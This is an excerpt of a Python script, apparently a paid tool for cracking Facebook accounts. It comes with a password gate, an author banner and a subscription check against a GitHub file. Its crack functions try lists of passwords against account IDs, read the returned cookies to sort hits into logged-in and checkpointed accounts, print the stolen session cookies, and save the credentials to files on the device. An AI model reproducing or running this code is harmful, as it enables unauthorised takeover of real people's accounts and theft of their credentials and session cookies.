...
def main():
    stored_password = "RJR TEAM"  # Replace with your stored password
    ...
    while True:
        ...
        if is_password_valid(user_password, stored_password):
            ...
            print("Welcome to ✮⃝RꫝKIB𝄟⃝🔵 TOOLS!")
            os.system('espeak -a 300 "Welcome to ✮⃝RꫝKIB𝄟⃝🔵 Tools varson 1.2 ..."')
            time.sleep(2)
            os.system('clear')
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38m✮⃝RꫝKIB𝄟⃝🔵\33[1;38m    ║\033[1;31m 
╠══[Facebook                 • RAKIB ON     ║  \033[1;97m  
╠══[Github                   • \33[1;38mMr-Rakib-404 ║\33[1;34m   
╠══[Whatsapp                 • 01786100329  ║\33[1;35m 
╠══[TOOLS                    • PAID         ║ \33[1;32m   
...
def Subscraption():
    ...
    os.system('clear')
    print(logo)
    r1 = requests.get("https://github.com/Mr-Rakib-404/2V/blob/main/2v.txt").text
    if id in r1:
        os.system('clear')
        print(logo)
    else:
...
os.system('espeak -a 300 " Welcome,   to,   ✮⃝RꫝKIB𝄟⃝🔵-KIBG,  Tools"')
pass
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/✮⃝RꫝKIB𝄟⃝🔵.txt  Etc...]')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[✮⃝RꫝKIB𝄟⃝🔵•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.write(f"\r\033[100;92m{bo}[✮⃝RꫝKIB𝄟⃝🔵•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [OK{bo}•{H}{ok}{P}] [{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;97m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                open('/sdcard/✮⃝RꫝKIB𝄟⃝🔵-CP.txt', 'a').write( cid+' | '+ps+' \n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
                ...
                print(f'\r\033[0;95m✮⃝RꫝKIB𝄟⃝🔵-Ok] {idf} \033[0;97m• \033[0;95m{pw}\n\033[0 ;[🌺]= COOKIES • \x1b[38;5;208m{kuki}\033[0;97m\n')
                #cek_apk(session,coki)
                print(f'\r\033[0;95m[✮⃝RꫝKIB𝄟⃝🔵\033[0;97m•\033[0;95mOk💚] {idf} \033[0;97m• \033[0;95m{pw}\n\033[0;93m[🌺]= COOKIES • \033[100;92m{kuki}\033[0;97m\n')
                os.system('espeak -a 300 " Rakib,  Ok,  id"')
                open('/sdcard/✮⃝RꫝKIB𝄟⃝🔵-Ok.txt', 'a').write( cid+' | '+ps+' \n')
                break
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[✮⃝RꫝKIB𝄟⃝🔵-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                #cek_apk(session,coki)
                os.system('espeak -a 300 " ✮⃝RꫝKIB𝄟⃝🔵,  Ok,  id"')
                open('/sdcard/✮⃝RꫝKIB𝄟⃝🔵-Ok.txt', 'a').write( cid+' | '+ps+' \n')
                break
